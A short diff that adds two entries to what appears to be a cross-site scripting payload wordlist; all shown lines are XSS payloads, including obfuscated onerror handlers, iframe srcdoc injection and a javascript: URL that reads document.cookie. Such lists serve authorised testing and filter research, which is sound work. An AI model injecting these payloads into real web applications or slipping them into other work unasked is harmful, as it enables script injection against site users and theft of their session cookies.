@@ -226,6 +226,7 @@ onfocus=alert(document.domain)
 <img/src/onerror=alert/1337/(1)>
 <img/src/onerror=alert//&NewLine;(2)>
 <img/src/onerror=alert&sol;&sol;(3)>
+<Img Src=OnXSS OnError=prompt(1337)>
 '"/><script%20>alert(document.domain)<%2fscript>.css
 <iframe srcdoc="<img src=x onerror=alert(999)>"></iframe>
 /path?next=javascript:top[/al/.source+/ert/.source](document.cookie)
@@ -729,6 +730,7 @@ javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembe
 <img src=x onerror=\x12"javascript:alert(1)">
 <img src=x onerror=\x32"javascript:alert(1)">
 <img src=x:alert(alt) onerror=eval(src) alt=0>
+<img src"x:gif" onerror="window['al/u0065rt'](0)"></img>
 <img src=x\x09onerror="javascript:alert(1)">
 <img src=x\x10onerror="javascript:alert(1)">
 <img src=x\x11onerror="javascript:alert(1)">
